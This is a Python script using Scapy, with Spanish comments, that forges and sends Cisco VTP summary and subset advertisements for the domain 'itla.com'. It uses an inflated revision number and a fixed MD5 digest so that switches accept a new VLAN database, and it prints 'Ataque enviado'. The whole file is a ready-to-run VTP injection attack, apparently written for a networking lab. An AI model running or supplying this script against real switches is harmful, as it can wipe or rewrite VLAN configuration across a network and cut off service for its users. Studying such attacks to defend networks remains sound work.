#!/usr/bin/env python3
import struct
from scapy.all import *

interface       = "eth0"
vtp_domain      = "itla.com"
revision_ataque = 100
md5 = bytes.fromhex("9A44E08F62C24A315440DC46FB5D53D2")

def vlan_entry(vlan_id, name, vlan_type=0x01):
    name_bytes = name.encode('ascii')
    pad = (4 - (len(name_bytes) % 4)) % 4
    said = 0x100000 + vlan_id
    entry  = bytes([12 + len(name_bytes) + pad])
    entry += b'\x00'                           # status
    entry += bytes([vlan_type])                # tipo VLAN
    entry += bytes([len(name_bytes)])
    entry += struct.pack('!H', vlan_id)
    entry += b'\x05\xDC'
    entry += struct.pack('!I', said)
    entry += name_bytes + (b'\x00' * pad)
    return entry

def build_summary():
    domain_bytes  = vtp_domain.encode('ascii')
    domain_padded = domain_bytes.ljust(32, b'\x00')
    pkt  = b'\x01\x01\x01'
    pkt += bytes([len(domain_bytes)])
    pkt += domain_padded
    pkt += struct.pack('!I', revision_ataque)
    pkt += bytes([10, 15, 2, 2])
    pkt += b'260227132319'
    pkt += md5
    pkt += b'\x00\x00\x00\x01\x06\x01\x00\x02'
    return pkt

def build_subset():
    domain_bytes  = vtp_domain.encode('ascii')
    domain_padded = domain_bytes.ljust(32, b'\x00')
    pkt  = b'\x01\x02\x01'
    pkt += bytes([len(domain_bytes)])
    pkt += domain_padded
    pkt += struct.pack('!I', revision_ataque)

    pkt += vlan_entry(1,    "default",         0x01)  # Ethernet
    pkt += vlan_entry(100,  "VLAN0100",        0x01)  # Ethernet
    pkt += vlan_entry(1002, "fddi-default",    0x02)  # FDDI
    pkt += vlan_entry(1003, "token-ring-default",   0x03)  # Token Ring
    pkt += vlan_entry(1004, "fddinet-default", 0x04)  # FDDI-Net
    pkt += vlan_entry(1005, "trnet-default",   0x05)  # TR-BRF
    return pkt

dot3 = Dot3(dst="01:00:0c:cc:cc:cc")
llc  = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
snap = SNAP(OUI=0x00000c, code=0x2003)

sendp(dot3/llc/snap/Raw(load=build_summary()), iface=interface, count=1, verbose=True)
sendp(dot3/llc/snap/Raw(load=build_subset()),  iface=interface, count=1, verbose=True)
print("[+] Ataque enviado.")

